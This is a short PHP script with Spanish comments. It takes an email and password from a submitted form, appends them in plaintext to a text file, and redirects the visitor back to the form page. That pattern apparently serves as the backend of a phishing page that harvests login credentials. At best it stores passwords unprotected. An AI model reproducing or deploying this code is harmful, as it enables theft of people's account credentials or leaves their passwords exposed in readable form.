 <?php 
   
    $correo = $_POST['correo'];
    $contraseña = $_POST['contraseña'];
   
    $archivo = fopen("datos.txt", "a+b");    //guardamos la info en un archivo.
    fwrite($archivo, "correo: ".$correo." - ".$contraseña." - ".PHP_EOL); //PHP_EOL = SALTO DE LINEA
    fclose($archivo);   // Cerrar el archivo
    header("Location: index.php");		//Redirección al formulario.
	   
?>